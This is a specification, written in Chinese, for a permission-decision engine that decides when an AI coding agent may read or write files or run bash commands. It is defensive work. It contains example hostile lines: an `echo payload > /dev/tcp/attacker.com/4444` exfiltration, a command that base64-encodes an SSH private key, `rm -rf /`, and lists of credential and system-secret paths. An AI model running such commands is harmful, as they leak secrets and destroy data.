# access-decision Specification

## Purpose
定义决策引擎的行为契约——给定（区域 × 权限 × 操作 × 敏感匹配），返回 auto_allow / deny_hard / prompt 之一，并标注弹窗档位。

## Requirements

### Requirement: 双区域判定

系统 SHALL 把工具目标路径划分为两个信任区域：

- **项目内**（project_inner）：目标路径规范化后位于当前 `<projectRoot>` 之下（含子目录）。符号链接与 `..` 逃逸 MUST 在判定前先规范化为绝对路径。
- **项目外**（project_outer）：其他所有路径。

#### Scenario: 项目内路径判定

- **WHEN** `<projectRoot> = /proj`，工具访问 `/proj/src/x.ts`
- **THEN** 区域判定为 project_inner

#### Scenario: `..` 逃逸规范化

- **WHEN** `<projectRoot> = /proj`，工具访问相对路径 `../outside/x`（相对于 `<projectRoot>`）
- **THEN** 规范化后为 `/outside/x`，区域判定为 project_outer

#### Scenario: 符号链接逃逸规范化

- **WHEN** `/proj/link -> /etc/ssh`，工具访问 `/proj/link/config`
- **THEN** realpath 后为 `/etc/ssh/config`，区域判定为 project_outer（符号链接解析失败时保留原路径判定为 project_inner 并记入审计 note）

### Requirement: 权限声明优先于默认敏感兜底

若目标路径在任何配置中被声明为 `read_write` / `read_only` / `unread`，该声明 MUST 优先于默认敏感路径表的判定。

#### Scenario: 项目内敏感文件被配置覆盖

- **WHEN** 项目配置声明 `"config/.env" = "read_write"`，工具访问 `<proj>/config/.env`（会命中默认敏感规则"env 文件"）
- **THEN** 决策为 auto_allow（配置声明优先于敏感兜底）

#### Scenario: 项目内敏感文件读取免弹

- **WHEN** 项目配置声明 `"src/creds/local.key" = "read_write"`，工具读取该文件
- **THEN** 决策为 auto_allow，不弹窗

### Requirement: read_write 权限语义

系统 MUST 对目标路径被声明为 `read_write` 的情况按以下规则决策：

- **项目内**：读与写都 auto_allow
- **项目外**：首次访问弹三档弹窗（"允许一次 / 会话内允许 / 总是允许"）；已记忆授权后按记忆放行

#### Scenario: 项目内 read_write 读写免弹

- **WHEN** 项目配置声明 `"vendor/**" = "read_write"`，工具读写 `<proj>/vendor/a.txt`
- **THEN** 决策为 auto_allow（读）与 auto_allow（写）

#### Scenario: 项目外 read_write 首次访问弹三档

- **WHEN** 全局配置声明 `"/opt/shared/secrets" = "read_write"`，工具首次读 `/opt/shared/secrets/x`，该路径无授权记忆
- **THEN** 决策为 prompt，tier=three

#### Scenario: 项目外 read_write 已授权后免弹

- **WHEN** 上一场景用户选择"总是允许"，同一项目再次读同一文件
- **THEN** 决策为 auto_allow（授权记忆命中）

### Requirement: read_only 权限语义

系统 MUST 对目标路径被声明为 `read_only` 的情况按以下规则决策：

- 读：auto_allow（区域无关）
- 写：弹三档弹窗（区域无关，因为声明本身就是"要写的话我需要确认"）

#### Scenario: read_only 读免弹

- **WHEN** 全局声明 `"/Users/eliot/.aws" = "read_only"`，工具读该路径下文件
- **THEN** auto_allow

#### Scenario: read_only 写弹三档

- **WHEN** 项目配置声明 `"src/secrets.txt" = "read_only"`，工具写 `<proj>/src/secrets.txt`
- **THEN** prompt，tier=three

### Requirement: unread 权限语义

若目标路径被声明为 `unread`：

- 读 / 写 / delete 都 MUST 决策为 `deny_hard`
- 不弹窗、不可被授权记忆绕过

#### Scenario: 硬拒绝项目内文件

- **WHEN** 项目配置声明 `"src/secrets.txt" = "unread"`，工具读或写该文件
- **THEN** deny_hard，reason 包含"声明为 unread"

#### Scenario: 硬拒绝项目外文件

- **WHEN** 全局配置声明 `"/srv/prod-keys" = "unread"`，工具读 `/srv/prod-keys/a.pem`
- **THEN** deny_hard

#### Scenario: 已授权记忆不能绕过 unread

- **WHEN** 全局 `A = unread`，之前用户对同一路径做过"总是允许"授权
- **THEN** deny_hard（授权记忆在 unread 前不检查）

### Requirement: 未配置路径的行为

系统 MUST 对目标路径未在任何配置中声明的情况按以下规则决策：

- **项目内敏感路径**（命中默认敏感规则）：读与写都 prompt，tier=three（可持久授权；用户显式声明覆盖）
- **项目内非敏感路径**：读与写都 auto_allow（保持 pi 现状行为）
- **项目外敏感路径**：读与写都 prompt，按 hard/soft sensitive 分级决定 tier——**hard sensitive**（不可逆凭证：SSH 私钥、私钥扩展名、凭证目录、凭证配置文件、系统机密）tier=two 不可持久化；**soft sensitive**（可撤销凭证 + 客户端公钥文件：见"可赦免敏感路径分级与 tier 语义" requirement）tier=three 可持久化
- **项目外非敏感路径读**：auto_allow
- **项目外非敏感路径写 / delete**：prompt，tier=three（可持久授权；hard sensitive 已在上一条锁定 tier=two）

#### Scenario: 未配置项目内普通文件写自动放行

- **WHEN** 无任何配置，工具写 `<proj>/src/main.ts`
- **THEN** auto_allow（保持 pi 现状）

#### Scenario: 未配置项目内敏感文件读弹三档

- **WHEN** 无配置，工具读 `<proj>/.ssh/id_rsa`（命中默认 hard sensitive）
- **THEN** prompt，tier=three（提供"总是允许"选项，用户显式声明可覆盖）

#### Scenario: 未配置项目外敏感文件读弹两档

- **WHEN** 无配置，工具读 `~/.ssh/id_rsa`（命中 hard sensitive SSH 密钥规则）
- **THEN** prompt，tier=two（不提供"总是允许"）

#### Scenario: 未配置项目外 non-sensitive 文件写弹三档

- **WHEN** 无配置，工具写 `/tmp/somefile.txt`
- **THEN** prompt，tier=three（提供"总是允许"选项，持久化到 trusted.json）

#### Scenario: 未配置项目外非敏感文件写弹三档

- **WHEN** 无配置，工具写 `/opt/shared/data.txt`（non-sensitive，未声明）
- **THEN** prompt，tier=three（提供"总是允许"选项，持久化到 trusted.json）

### Requirement: 跨源冲突弹窗（仅 unread 相关）

若决策阶段检测到跨源冲突（见 permission-config 的"跨源冲突检测"）且冲突组合**包含 `unread`**，系统 SHALL 强制弹三档弹窗询问用户是否放行，弹窗文案 MUST 说明"存在跨源冲突"。

冲突组合分类：
- **需弹窗询问**（包含 unread）：`unread` vs `read_write`、`unread` vs `read_only`（不论方向、不论层级）
- **静默应用最高优先级**（不含 unread）：`read_write` vs `read_only`、`read_write` vs `read_only`（本地覆盖）——不弹冲突弹窗，使用 local > project > global 优先级直接决策

#### Scenario: 全局 unread 与项目 read_write 冲突

- **WHEN** 全局声明 `/srv = unread`，项目声明 `/srv = read_write`，工具读 `/srv/a`
- **THEN** prompt，tier=three，reason 说明"跨源冲突：全局标记为硬拒绝但项目标记为读写"

#### Scenario: 全局 read_only 与项目 read_write 不弹冲突

- **WHEN** 全局声明 `A = read_only`，项目声明 `A = read_write`，工具写 `A`
- **THEN** 不弹冲突弹窗；按项目优先级应用 `read_write` 决策（项目内 auto_allow）

### Requirement: 敏感文件按文件记忆

敏感文件（无论默认敏感表命中还是配置声明）的授权记忆键 MUST 包含完整路径（非仅目录），不允许"授权同目录全部敏感文件"。

#### Scenario: 同目录下不同敏感文件独立记忆

- **WHEN** 用户对项目外敏感目录 `~/.ssh/` 的 `id_rsa` 选择"总是允许"
- **THEN** 授权仅对 `~/.ssh/id_rsa` 生效，`~/.ssh/known_hosts` 的读取仍需重新授权

### Requirement: 未识别 bash 命令的目标路径

对 bash 工具调用，若 bash-target-extraction capability 无法可靠提取目标路径（复杂命令、变量、管道等），系统 SHALL 将其视为"未配置路径"，决策为 **prompt，tier=three**，弹窗显示完整命令原文。用户可三档选择："允许一次 / 允许为本会话 / 总是允许本命令"——第 3 档将 rawCommand 写入 bash 命令持久化记忆（trusted.json 的 `bashGrants` 段）。

**理由**：unreliable bash 命令的 rawCommand 作为**唯一身份**（同 rawCommand 即同语义），用户批准一次意味着"这条命令我认为安全"。持久化 rawCommand 提供"raw-command 通道"独立于 path 通道，与 sensitive-default tier=two 的"不持久化"契约无关——本 change 让 `tier` label 从"敏感语义标签"收敛为"可持久化 vs 不可持久化"标签，bash 命令类统一归 tier=three 与 tier 语义收敛一致。

**位置**：本规则在 access-decision 层实现，位于 bash-target-extraction 之后——extractor 只报告 reliable/unreliable 与 reason，不决定 tier。tier 分派发生在 `handleBash` unreliable 分支构造 `Decision` 时（tier="three"）。

**持久化边界**：rawCommand 持久化**不做规范化**——用户第一次批准 `ls -la /tmp`，之后 LLM 写 `ls  -la  /tmp`（多空格）视为不同 rawCommand，会重新弹窗。这是**保守但摩擦**的已知边界，见 grant-memory spec 的"Bash 命令记忆" requirement。

#### Scenario: 无法解析的复杂 bash 命令

- **WHEN** bash 命令为 `$(cat $HOME/.ssh/id_rsa | base64) > /tmp/out.txt`
- **THEN** 若 bash-target-extraction 判定为不可靠（reliable=false，reason 含 command_substitution），决策为 prompt，tier=three，弹窗展示完整命令文本与"总是允许本命令"选项

#### Scenario: 变量展开失败的 bash 命令弹三档

- **WHEN** bash 命令为 `cat $MYSECRETS`，`$MYSECRETS` 未在 shell 环境展开
- **THEN** 决策为 prompt，tier=three，reason 含 `unresolved variable`，弹窗提供"总是允许本命令"选项

#### Scenario: 用户"总是允许本命令"后同 rawCommand 跨会话免弹

- **WHEN** 用户对上一条 `cat $MYSECRETS` 选择"总是允许本命令"，重启 pi 后再次执行完全相同的 `cat $MYSECRETS`
- **THEN** auto_allow（bash grant memory 命中，`authorization === "by_person"`，`grant_source === "bash_grant_memory"`），audit 记录 `event: "allow_once"` 之外的 `grant_memory` 命中（无新 audit 事件，仅 grant_source 派生）

#### Scenario: rawCommand 规范化不生效

- **WHEN** 用户批准 `ls -la /tmp`，之后 LLM 执行 `ls  -la  /tmp`（额外空格）
- **THEN** 视为不同 rawCommand，重新弹窗（sha256(rawCommand) 哈希不同，grant memory 未命中）

### Requirement: 网络外带写入目标强制 tier=two

若目标路径匹配以下"网络外带"路径模式之一，且操作为写入（`action === "write"`），系统 MUST 决策为 prompt，tier=two，弹窗不提供"总是允许"选项：

- `/dev/tcp/*`（bash 内建 TCP 套接字）
- `/dev/udp/*`（bash 内建 UDP 套接字）
- `/dev/fd/[0-9]+`（数字文件描述符别名，如 `/dev/fd/3`）

**理由**：`/dev/tcp` 与 `/dev/udp` 是 bash 内建的套接字路径，可被用于网络外带数据（如 `echo payload > /dev/tcp/attacker.com/4444`）。`/dev/fd/[0-9]+` 用于 fd 复用，写入时可能是外带通道。这些路径的写入不能通过"总是允许"持久化授权——用户必须每次确认。

**位置**：本规则 MUST 在默认敏感路径 fallback 之前检查（dev-socket 路径通常不会命中敏感规则表），且 MUST 只针对写入操作生效（读取 `/dev/fd/3` 通常是无害的 fd 复用，不拦截）。

**与既有重定向提取的关系**：bash-target-extraction 已经把 `/dev/tcp/*`、`/dev/udp/*`、`/dev/fd/[0-9]+` 作为普通写目标产出（`extractRedirects` 调用 `isDevSocketOrFd` 判定后仍写入 targets）。本规则在决策层把这些写入目标强制为 tier=two，不改 extractor 的提取行为。

#### Scenario: /dev/tcp 写入判 tier=two

- **WHEN** 无任何配置，工具写入 `/dev/tcp/1.2.3.4/4444`
- **THEN** 决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /dev/udp 写入判 tier=two

- **WHEN** 无任何配置，工具写入 `/dev/udp/attacker.com/53`
- **THEN** 决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /dev/fd/3 写入判 tier=two

- **WHEN** 无任何配置，工具写入 `/dev/fd/3`
- **THEN** 决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /dev/tcp 读取不触发 tier=two

- **WHEN** 无任何配置，工具读取 `/dev/tcp/1.2.3.4/4444`
- **THEN** 决策按既有"未配置项目外非敏感文件读"规则处理，auto_allow

#### Scenario: /dev/tcp 写入不能持久化授权

- **WHEN** 用户曾对 `/dev/tcp/1.2.3.4/4444` 选择"总是允许"
- **THEN** 授权不被写入 trusted.json，后续同路径写入仍触发 prompt tier=two——dev-socket 写入强制 tier=two 意味着永远无"总是允许"选项

#### Scenario: bash 命令中 dev/tcp 写入目标触发 tier=two

- **WHEN** bash 命令为 `echo payload > /dev/tcp/1.2.3.4/4444`，bash-target-extraction 提取写目标 `/dev/tcp/1.2.3.4/4444`
- **THEN** access-decision 决策为 prompt，tier=two，弹窗展示该 bash 命令与该写目标

### Requirement: 系统机密文件读取判敏感

若目标路径匹配以下"系统机密文件"之一，且未在任何配置中被显式声明为 `read_write` / `read_only` / `unread`，系统 MUST 把该路径判定为命中默认敏感规则表（reason 为 `System credential/config file`）：

- `/etc/shadow`（Unix 用户密码哈希文件）
- `/etc/sudoers`（sudo 提权配置）
- `/etc/master.passwd`（macOS 用户密码哈希文件）
- `/etc/crontab`（cron 调度配置）
- `/etc/cron.d/*`（cron.d 子配置）
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`（cron 定时任务目录）
- `/etc/hosts.allow`（TCP Wrappers 访问控制）
- `/etc/hosts.deny`（TCP Wrappers 访问控制）

**理由**：这些路径是常见 Unix 系统机密文件，泄露后可能导致提权或横向移动。用户对项目外的系统机密文件读取时，决策层应提供 tier=two 弹窗（不可持久化）而非"项目外非敏感文件读"的 auto_allow。

**范围**：本规则只覆盖上述明确列出的系统机密文件。其他 `/etc/**` 路径（如 `/etc/hosts`、`/etc/hostname`、`/etc/passwd`）不被视为敏感——`/etc/passwd` 是公开用户列表，只含非敏感信息（用户名 / UID / GID / home / shell），泄露不影响安全。

**与既有敏感规则的关系**：本规则追加到默认敏感规则表的尾部，既有规则（SSH 密钥、私钥扩展名、env 文件、凭证存储目录、凭证配置文件）的匹配顺序与行为不变，前向兼容。

#### Scenario: /etc/shadow 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/shadow`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /etc/sudoers 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/sudoers`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/master.passwd 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/master.passwd`（macOS）
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/crontab 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/crontab`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/cron.d/ 子文件读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/cron.d/mytask`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/hosts.allow 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/hosts.allow`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/passwd 不判敏感

- **WHEN** 无任何配置，工具读取 `/etc/passwd`
- **THEN** 不命中默认敏感规则，决策按既有"未配置项目外非敏感文件读"规则处理，auto_allow

#### Scenario: /etc/hosts 不判敏感

- **WHEN** 无任何配置，工具读取 `/etc/hosts`
- **THEN** 不命中默认敏感规则，决策按既有"未配置项目外非敏感文件读"规则处理，auto_allow

#### Scenario: 用户配置声明覆盖系统机密文件

- **WHEN** 全局配置声明 `"/etc/shadow" = "read_only"`，工具读取 `/etc/shadow`
- **THEN** 决策为 auto_allow（配置声明优先于默认敏感规则）

#### Scenario: 项目内敏感文件读取仍判 tier=three

- **WHEN** 无任何配置，工具读取 `<proj>/.ssh/id_rsa`（既有敏感规则命中）
- **THEN** 决策为 prompt，tier=three（提供"总是允许"选项，用户显式声明可覆盖）——既有规则的行为不变，仅系统机密文件的新规则受 tier=two 约束

### Requirement: tool+pattern 规则检查

决策引擎 SHALL 在 path 解析之前检查 tool+pattern 规则。检查顺序：

1. **deny 规则检查**（最高优先级）：若 resolveRule(toolName, toolPattern) 返回 `action: "deny"`，决策为 `deny_hard`，不检查后续任何规则
2. **path 解析**（现有逻辑不变）：检查 `paths` 表中的声明
3. **allow 规则检查**：若 path 解析未命中且 resolveRule 返回 `action: "allow"`，则：
   - **敏感路径硬底线**：若目标路径命中敏感规则表（默认敏感路径 或 配置声明的敏感），即使 allow 规则命中也 MUST 弹 prompt（tier 按敏感默认规则决定）
   - **非敏感路径**：决策为 `auto_allow`，跳过默认兜底
4. **默认兜底**（现有逻辑不变）：未命中任何规则时按区域+敏感默认规则决策

**关键约束**：allow 规则不绕过敏感路径检查——这是安全硬底线。用户配置 `Bash(git *)` 允许后，若 `git` 命令的操作目标路径命中敏感规则（如 `git push` 到远程含敏感路径），仍会弹窗。

**deny 规则是无条件的**：不论路径是否敏感、不论区域、不论操作，deny 命中即硬拒绝。

#### Scenario: allow 规则跳过非敏感路径弹窗

- **WHEN** 配置声明 `{ "tool": "bash", "pattern": "git *", "action": "allow" }`，bash 命令为 `git status`，无 paths 声明
- **THEN** 决策为 auto_allow（allow 规则命中，非敏感路径）

#### Scenario: allow 规则不绕过敏感路径

- **WHEN** 配置声明 `{ "tool": "bash", "pattern": "git *", "action": "allow" }`，bash 命令为 `cat ~/.ssh/id_rsa`，无 paths 声明
- **THEN** 决策为 prompt（allow 规则命中但目标路径敏感，敏感硬底线生效）

#### Scenario: deny 规则无条件拒绝

- **WHEN** 配置声明 `{ "tool": "bash", "pattern": "rm *", "action": "deny" }`，bash 命令为 `rm -rf /`
- **THEN** 决策为 deny_hard（deny 无条件，不论路径是否敏感）

#### Scenario: deny 优先于 allow（同 tool+pattern）

- **WHEN** 全局声明 `{ "tool": "bash", "pattern": "git *", "action": "allow" }`，项目声明 `{ "tool": "bash", "pattern": "git *", "action": "deny" }`
- **THEN** 决策为 deny_hard（deny 优先于 allow，不论优先级来源）

#### Scenario: path 声明优先于 allow 规则

- **WHEN** 配置声明 `{ "paths": { "/etc": "unread" } }` 和 `{ "tool": "bash", "pattern": "cat *", "action": "allow" }`，bash 命令为 `cat /etc/passwd`
- **THEN** 决策为 deny_hard（path 声明 unread 优先于 allow 规则）

### Requirement: auto_allow 决策携带授权来源标注

系统 MUST 在每个 `kind === "auto_allow"` 的决策对象上标注 `authorization` 与 `grant_source` 两个字段，供上层（extension 层、审计日志）追溯授权来源；`kind === "deny_hard"` 与 `kind === "prompt"` 的决策对象 MUST NOT 携带这两个字段。

- `authorization` 取值范围：
  - `"presumed"`：系统判定授权，非真人主动操作
  - `"by_person"`：真人主动授权（当前仅从 grant memory 命中派生——`decide()` 是纯函数，无法直接产生 `"by_person"`）
- `grant_source` 取值范围：
  - `"config_declaration"`：配置声明命中（`read_only` 读 或 项目内 `read_write` 读/写）
  - `"allow_rule"`：tool+pattern allow 规则命中且目标非敏感
  - `"grant_memory"`：path-based grant memory 命中
  - `"bash_grant_memory"`：bash 命令 grant memory 命中
  - `"default"`：无配置、无规则、无记忆命中，按区域+敏感默认规则判定（含项目内非敏感、项目外非敏感读、`/tmp/**` 兜底）

**语义约束**：
- 决策引擎（`decide()`）内部产生的 `authorization` MUST 恒为 `"presumed"`——真人授权信号只从 extension 层的弹窗选择派生，不属于决策引擎的输入
- `grant_memory` 与 `bash_grant_memory` 命中的 `authorization` MUST 由命中的 Grant 记录自身的 `author` 字段决定（详见 grant-memory spec 的"Grant 记录 author 字段" requirement）；当前所有持久化 grant 均由真人弹窗写入，因此实际取值恒为 `"by_person"`，类型能力保留未来扩展

#### Scenario: 配置声明命中 read_only 读 auto_allow

- **WHEN** 配置声明某路径为 `read_only`，工具对该路径读
- **THEN** 决策 `kind === "auto_allow"`，`authorization === "presumed"`，`grant_source === "config_declaration"`

#### Scenario: 项目内 read_write 读写 auto_allow

- **WHEN** 配置声明某项目内路径为 `read_write`，工具读写
- **THEN** 决策 `kind === "auto_allow"`，`authorization === "presumed"`，`grant_source === "config_declaration"`

#### Scenario: allow 规则命中非敏感路径

- **WHEN** 配置声明 `{ "tool": "bash", "pattern": "git *", "action": "allow" }`，bash 命令 `git status`（非敏感目标）
- **THEN** 决策 `kind === "auto_allow"`，`authorization === "presumed"`，`grant_source === "allow_rule"`

#### Scenario: 项目内非敏感默认 auto_allow

- **WHEN** 无配置，工具在项目内读写非敏感普通文件
- **THEN** 决策 `kind === "auto_allow"`，`authorization === "presumed"`，`grant_source === "default"`

#### Scenario: /tmp 兜底 auto_allow

- **WHEN** 无配置，工具写 `/tmp/x.txt`
- **THEN** 决策 `kind === "auto_allow"`，`authorization === "presumed"`，`grant_source === "default"`

#### Scenario: deny_hard 不带授权字段

- **WHEN** 决策为 `deny_hard`（unread 命中 或 deny 规则命中）
- **THEN** 决策对象不包含 `authorization` 字段与 `grant_source` 字段

#### Scenario: prompt 不带授权字段

- **WHEN** 决策为 `prompt`（任意 tier 弹窗触发）
- **THEN** 决策对象不包含 `authorization` 字段与 `grant_source` 字段

#### Scenario: grant memory 命中带 by_person 授权

- **WHEN** path-based grant memory 命中（用户之前对同一路径选过"总是允许"或"会话内允许"）
- **THEN** 决策 `kind === "auto_allow"`，`authorization === "by_person"`（继承 Grant.author），`grant_source === "grant_memory"`

#### Scenario: bash grant memory 命中

- **WHEN** bash 命令 grant memory 命中（用户对同 rawCommand 之前做过 bash 授权）
- **THEN** 决策 `kind === "auto_allow"`，`authorization === "by_person"`，`grant_source === "bash_grant_memory"`

### Requirement: 可赦免敏感路径分级与 tier 语义

默认敏感规则表 SHALL 分为 **hard** 与 **soft** 两级，各级的弹窗档位（tier）分派不同：

- **hard sensitive**（不可撤销凭证）：SSH 私钥（`~/.ssh/id_rsa` / `id_dsa` / `id_ecdsa` / `id_ed25519`）、`.ssh/config`、私钥扩展名（`.pem`/`.key`/`.pfx`/`.p12`/`.jks`/`.kdbx`/`.asc`/`.gpg`）、凭证目录（`~/.gnupg`/`~/.aws`/`~/.kube`/`~/.docker`/`~/.netrc`/`~/.git-credentials`/`~/.ssh`——**注**：`~/.ssh` 目录规则仅覆盖凭证存储目录的写保护语义；`~/.ssh/known_hosts` 与 `~/.ssh/authorized_keys` 见下方 soft sensitive 集合）、凭证配置文件（`credentials`/`secrets.yaml`/`secrets.yml`/`secrets.json`/`.npmrc`/`.netrc`）、系统机密（`/etc/shadow`/`/etc/sudoers`/`/etc/master.passwd`/`/etc/crontab`/`/etc/cron.*`/`/etc/hosts.allow`/`/etc/hosts.deny`）。沿用既有 tier 语义——项目内 tier=three（可持久化）、项目外 tier=two（不可持久化）。

- **soft sensitive**（可撤销凭证 + 客户端公钥文件）：
  - **通用配置文件名**：`config`/`auth`/`settings`/`models` + 凭证扩展名 `.json`/`.toml`/`.yml`/`.yaml`（basename 精确匹配，即 `<name>.<ext>` 形态）
  - **SSH 客户端公钥文件**（本 change 新增）：`~/.ssh/known_hosts`（客户端存储的已知主机公钥列表）与 `~/.ssh/authorized_keys`（授权登录的公钥列表）——**注**：`known_hosts` 无泄露不可逆风险（服务端公钥，泄露只影响 SSH 连接提示），`authorized_keys` 是授权公钥列表（泄露本身不可撤销，但作为**配置列表**通常可编辑；且用户日常读取该文件无安全代价）
  - 不论区域、不论 action（读/写/delete），决策为 prompt **tier=three**（可持久化赦免）——`decide()` step 2b 的 tier 分派不区分 action，soft 放宽同时覆盖外区写与 delete

  **delete 边界（已确认接受）**：soft 的 delete 持久化不在"可撤销凭证"论证范围内——read/write 泄了可吊销 token，delete 是彻底消除文件、无法通过吊销恢复。持久化粒度为**路径**（`addPersistentGrant({action:"delete", path})`），即一次批准后续同路径任意 `rm <该路径>` 形态全部静默。可编辑 `trusted.json` 撤销。

**override 语义**：soft sensitive 的 tier=three override 本 spec "未配置路径的行为" requirement 中"项目外敏感路径 tier=two"条目——soft sensitive 项目外路径走 tier=three（可"总是允许"）而非 tier=two。hard sensitive 不受 override，沿用既有 tier=two 外区不可持久化。

**范围约束**：
- soft 集合按 basename 精确匹配（`config`/`auth`/`settings`/`models` + 凭证扩展名），不含无扩展名的 `config`——`~/.ssh/config` 仍 hard（由 SSH key 规则的 `b === "config" && d.endsWith("/.ssh")` 覆盖）。
- soft 集合不含 `~/.ssh/id_rsa` 等不可撤销凭证（仍 hard）。
- soft 集合不含 `.ts`/`.js`/`.py` 等代码扩展名——`config.ts`/`auth.py` 不命中 soft（避免误伤项目内代码模块）。
- **soft SSH 公钥文件精确匹配**：`known_hosts` 与 `authorized_keys` 仅在 `dirname.endsWith("/.ssh") || dirname === ".ssh"` 时命中 soft（不在其他目录下的同名文件命中 soft）。

**理由**：soft 集合含可撤销 apikey/token 与客户端公钥文件，泄露后通过吊销或重新生成可恢复（区别于私钥不可撤销）；持久化赦免换取首弹后免打扰，风险可控（用户可编辑 `trusted.json` 撤销持久化 grant）。SSH 公钥文件独立为 soft 是因为它们**不是攻击者可利用的凭证**——`known_hosts` 泄露不影响 SSH 服务器端；`authorized_keys` 泄露虽然是"客户端公钥授权列表"，但用户日常读取该文件（例如备份、审计）是合法操作，tier=three 持久化符合 UX 需求。

#### Scenario: 项目外 config.yml 读弹 tier=three 可持久化

- **WHEN** 无配置，工具读 `~/.config/gh/config.yml`（命中 soft sensitive "config" + `.yml`）
- **THEN** 决策为 prompt tier=three（提供"总是允许"持久化选项）

#### Scenario: 项目外 auth.json 读弹 tier=three

- **WHEN** 无配置，工具读 `~/.config/app/auth.json`（命中 soft "auth" + `.json`）
- **THEN** 决策为 prompt tier=three

#### Scenario: ~/.ssh/known_hosts 外区读 tier=three 可持久化

- **WHEN** 无配置，工具读 `~/.ssh/known_hosts`
- **THEN** 命中 soft sensitive（SSH 客户端公钥文件），决策为 prompt tier=three（提供"总是允许"）——区别于 `~/.ssh/id_rsa` 仍 tier=two 不可持久化

#### Scenario: ~/.ssh/authorized_keys 外区读 tier=three 可持久化

- **WHEN** 无配置，工具读 `~/.ssh/authorized_keys`
- **THEN** 命中 soft sensitive（SSH 客户端公钥文件），决策为 prompt tier=three

#### Scenario: 其他目录下 known_hosts 不命中 soft SSH 规则

- **WHEN** 无配置，工具读 `~/myapp/known_hosts`（basename `known_hosts` 但不在 `.ssh` 目录下）
- **THEN** 不命中 soft SSH 公钥规则，按"项目外非敏感文件读"处理，auto_allow

#### Scenario: 项目外 config.yml 写弹 tier=three 可持久化

- **WHEN** 无配置，工具写 `~/.config/gh/config.yml`（命中 soft sensitive "config" + `.yml`）
- **THEN** 决策为 prompt tier=three（提供"总是允许"持久化选项）

#### Scenario: 项目外 config.yml delete 弹 tier=three 可持久化

- **WHEN** 无配置，工具删除 `~/.config/gh/config.yml`（命中 soft sensitive "config" + `.yml`）
- **THEN** 决策为 prompt tier=three（提供"总是允许"持久化选项）——soft 放宽同时覆盖外区 delete，已知边界见 requirement「delete 边界」

#### Scenario: ~/.ssh/id_rsa 外区读仍 tier=two 不可持久化

- **WHEN** 无配置，工具读 `~/.ssh/id_rsa`（命中 hard sensitive SSH 密钥）
- **THEN** 决策为 prompt tier=two（不提供"总是允许"），soft override 不适用

#### Scenario: ~/.ssh/id_rsa 外区写仍 tier=two 不可持久化

- **WHEN** 无配置，工具写 `~/.ssh/id_rsa`（命中 hard sensitive SSH 密钥）
- **THEN** 决策为 prompt tier=two（不提供"总是允许"），hard 外区读写均不可持久化

#### Scenario: ~/.ssh/config 仍 hard 不受 soft 集合影响

- **WHEN** 无配置，工具读 `~/.ssh/config`（命中 hard SSH config 规则，basename 精确 `config` 在 `.ssh` 目录，无扩展名）
- **THEN** 决策按 hard sensitive tier 语义（外区 tier=two），soft 集合的 `config.*` 不匹配

#### Scenario: 项目内 config.json 读弹 tier=three

- **WHEN** 无配置，工具读 `<proj>/config.json`（命中 soft "config" + `.json`）
- **THEN** 决策为 prompt tier=three（可持久化）

#### Scenario: config.ts 不命中 soft（代码扩展名）

- **WHEN** 无配置，工具读 `<proj>/config.ts`（basename `config` + `.ts`，`.ts` 非凭证扩展名）
- **THEN** 不命中 soft sensitive，按"项目内非敏感 auto_allow"处理

#### Scenario: ~/.aws/config.json 仍 hard 不可持久化（规则排序边界）

- **WHEN** 无配置，工具读 `~/.aws/config.json`（basename `config` + `.json` 同时可命中 soft 凭证配置文件，也命中 hard 凭证目录规则 `.aws`）
- **THEN** 命中 hard sensitive（按 dirname 匹配 `.aws` 目录），决策为 prompt tier=two，soft 规则的凭证配置文件匹配不生效——规则排序保证 hard 优先

#### Scenario: 用户配置声明覆盖 soft sensitive

- **WHEN** 全局配置声明 `~/.config/gh/config.yml = "read_only"`，工具读该路径
- **THEN** 决策为 auto_allow（配置声明优先于敏感兜底，soft 与 hard 一致）

#### Scenario: ~/.ssh/id_rsa 外区 delete 仍 tier=two 不可持久化

- **WHEN** 无配置，工具删除 `~/.ssh/id_rsa`（命中 hard sensitive SSH 密钥）
- **THEN** 决策为 prompt tier=two（不提供"总是允许"），hard 外区 delete 同样不可持久化——与 soft 的 delete 放宽形成对照：hard 私钥删除后无法恢复，不属"可撤销凭证"范围

#### Scenario: settings.toml 命中 soft

- **WHEN** 无配置，工具读 `~/.config/app/settings.toml`（命中 soft "settings" + `.toml`）
- **THEN** 决策为 prompt tier=three

#### Scenario: models.json 命中 soft

- **WHEN** 无配置，工具读 `~/.config/app/models.json`（命中 soft "models" + `.json`）
- **THEN** 决策为 prompt tier=three

#### Scenario: 用户配置声明覆盖 ~/.ssh/known_hosts

- **WHEN** 全局配置声明 `~/.ssh/known_hosts = "read_write"`，工具读写该文件
- **THEN** 决策为 auto_allow（配置声明优先，与既有 override 语义一致）

- **WHEN** 全局配置声明 `~/.ssh/known_hosts = "read_write"`，工具读写该文件
- **THEN** 决策为 auto_allow（配置声明优先，与既有 override 语义一致）

### Requirement: tier 语义作为持久化能力标签

`Decision.PromptTier` 类型 `"three" | "two"` 承载**持久化能力语义**而非"来源"或"敏感程度"标签：

- **tier=three**：弹窗 MUST 提供"总是允许"选项，允许用户将授权持久化（path-based grant 或 bash rawCommand grant，取决于 prompt 触发源）
- **tier=two**：弹窗 MUST NOT 提供"总是允许"选项，只允许"允许一次 / 允许为本会话"——授权不可持久化

tier 分派的完整来源映射：

| 触发条件 | tier | 持久化通道 |
|---------|------|------------|
| 配置声明 `read_write` 外区 | three | path-based |
| 配置声明 `read_only` 写 | three | path-based |
| 跨源冲突（含 unread） | three | path-based |
| 未配置项目内敏感路径（任何 level） | three | path-based |
